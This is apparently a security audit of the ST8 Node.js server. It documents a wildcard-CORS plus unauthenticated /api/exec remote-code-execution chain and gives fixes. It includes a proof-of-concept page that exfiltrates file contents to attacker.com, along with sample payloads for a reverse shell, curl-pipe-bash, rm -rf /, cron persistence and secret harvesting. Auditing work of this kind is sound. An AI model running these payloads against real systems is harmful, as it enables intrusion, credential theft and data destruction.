# Security Audit: CORS + /api/exec RCE Chain

## Executive Summary

**Severity: CRITICAL**

The ST8 server contains a complete Remote Code Execution (RCE) attack chain that combines a CORS wildcard policy with an unauthenticated, unsanitized command execution endpoint. Any website visited by a user running the ST8 server can execute arbitrary commands on their machine.

---

## Vulnerability Details

### 1. CORS Wildcard Configuration

**Location:** `server.js:60-62`

```javascript
res.setHeader('Access-Control-Allow-Origin', '*');
res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
```

**Issue:** The wildcard `*` origin allows ANY website to make cross-origin requests to the ST8 server. This completely bypasses the Same-Origin Policy that browsers enforce to prevent malicious websites from accessing resources on other domains.

### 2. Unauthenticated Command Execution Endpoint

**Location:** `server.js:206-221`

```javascript
_handleExec(req, res) {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
        try {
            const { command } = JSON.parse(body);
            const { execSync } = require('child_process');
            const result = execSync(command, { encoding: 'utf-8', timeout: 30000 });
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ stdout: result, stderr: '' }));
        } catch (err) {
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ stdout: '', stderr: err.message }));
        }
    });
}
```

**Critical Issues:**
- **No Authentication:** No API key, token, or session validation
- **No Authorization:** No check for who is calling the endpoint
- **No Input Sanitization:** Raw command string passed directly to `execSync()`
- **No Command Allowlist:** Any command the OS can execute is permitted
- **30-second Timeout:** Long enough for destructive operations
- **Full Output Returned:** stdout and stderr are returned to the attacker

### 3. Network Exposure

**Location:** `server.js:49`

```javascript
this.server.listen(this.port, () => {
    console.log(`[st8:server] Server running on http://localhost:${this.port}`);
});
```

**Issue:** No host binding specified. In Node.js, when `listen()` is called without a host parameter, it defaults to binding on **all network interfaces** (`0.0.0.0`). This means:

- The server is accessible from the local machine
- The server is accessible from other machines on the same network
- The server may be accessible from the internet if firewall rules permit

The console log says "localhost" but this is misleading — the server binds to all interfaces.

---

## Attack Vector Analysis

### Attack Chain: Browser-Based RCE

```
┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐
│   Attacker's    │     │   Victim's      │     │   ST8 Server    │
│   Website       │     │   Browser       │     │   (Port 3847)   │
└────────┬────────┘     └────────┬────────┘     └────────┬────────┘
         │                       │                       │
         │  1. Victim visits     │                       │
         │     malicious site    │                       │
         │──────────────────────>│                       │
         │                       │                       │
         │  2. JavaScript sends  │                       │
         │     POST /api/exec    │                       │
         │                       │──────────────────────>│
         │                       │                       │
         │                       │  3. execSync(command) │
         │                       │                       │
         │                       │  4. Returns output    │
         │                       │<──────────────────────│
         │                       │                       │
         │  5. Exfiltrates data  │                       │
         │<──────────────────────│                       │
         │                       │                       │
```

### Step-by-Step Attack

1. **Attacker hosts malicious website** with embedded JavaScript
2. **Victim visits the website** while ST8 server is running on their machine
3. **JavaScript sends cross-origin POST request** to `http://localhost:3847/api/exec`
4. **CORS wildcard allows the request** — browser does not block it
5. **Server executes arbitrary command** via `execSync()`
6. **Output is returned** to the attacker's JavaScript
7. **Data exfiltrated** or further commands executed

### Proof of Concept

```html
<!-- Malicious website HTML -->
<html>
<body>
<h1>You won a prize!</h1>
<script>
// Attack payload — executes when page loads
fetch('http://localhost:3847/api/exec', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
        command: 'cat /etc/passwd && whoami && ls -la ~/.ssh/'
    })
})
.then(response => response.json())
.then(data => {
    // Exfiltrate data to attacker's server
    fetch('https://attacker.com/collect', {
        method: 'POST',
        body: JSON.stringify(data)
    });
});
</script>
</body>
</html>
```

---

## Impact Assessment

### Immediate Risks

| Risk | Severity | Description |
|------|----------|-------------|
| **Remote Code Execution** | CRITICAL | Arbitrary OS commands with 30s timeout |
| **Data Exfiltration** | CRITICAL | Read any file accessible to the process |
| **Credential Theft** | CRITICAL | Access SSH keys, tokens, passwords |
| **Malware Installation** | CRITICAL | Download and execute payloads |
| **Privilege Escalation** | HIGH | Commands run with server process privileges |
| **Lateral Movement** | HIGH | Access network resources from victim's machine |

### Attack Surface Expansion

- **Network Exposure:** If bound to 0.0.0.0, attacks possible from LAN/internet
- **No Rate Limiting:** Unlimited command execution attempts
- **No Logging:** No audit trail of executed commands
- **Silent Failure:** Errors returned as 200 OK with stderr in response body

---

## Injection Vectors

### 1. Direct Command Injection (Primary)

```json
{
    "command": "rm -rf / --no-preserve-root"
}
```

### 2. Command Chaining

```json
{
    "command": "ls; curl https://attacker.com/malware.sh | bash"
}
```

### 3. Reverse Shell

```json
{
    "command": "bash -i >& /dev/tcp/attacker.com/4444 0>&1"
}
```

### 4. Data Exfiltration

```json
{
    "command": "tar czf - ~/.ssh/ | base64"
}
```

### 5. Persistence

```json
{
    "command": "echo '* * * * * curl attacker.com/payload.sh | bash' | crontab -"
}
```

### 6. Environment Variable Exfiltration

```json
{
    "command": "env | grep -i key,token,secret,password"
}
```

---

## Recommendations

### Immediate Actions (P0)

1. **Remove `/api/exec` endpoint entirely** — This is the only safe option
2. **If exec is required:**
   - Add authentication (API key or token)
   - Implement command allowlist
   - Add input sanitization
   - Log all executions

### Short-term Fixes (P1)

3. **Fix CORS configuration:**
   ```javascript
   // Replace wildcard with specific origin
   const ALLOWED_ORIGIN = 'http://localhost:3847';
   res.setHeader('Access-Control-Allow-Origin', ALLOWED_ORIGIN);
   ```

4. **Bind to localhost only:**
   ```javascript
   this.server.listen(this.port, '127.0.0.1', () => {
       console.log(`[st8:server] Server running on http://127.0.0.1:${this.port}`);
   });
   ```

### Long-term Improvements (P2)

5. Add rate limiting to all endpoints
6. Implement request logging and audit trail
7. Add CSRF protection tokens
8. Implement proper authentication system
9. Add security headers (CSP, X-Frame-Options, etc.)

---

## Conclusion

The combination of CORS wildcard (`Access-Control-Allow-Origin: *`) and the unauthenticated `/api/exec` endpoint creates a **critical RCE vulnerability** that can be exploited by any website the user visits. This is a textbook example of why CORS wildcards should never be used with state-changing endpoints, especially those that execute system commands.

**This vulnerability must be addressed before any production deployment.**
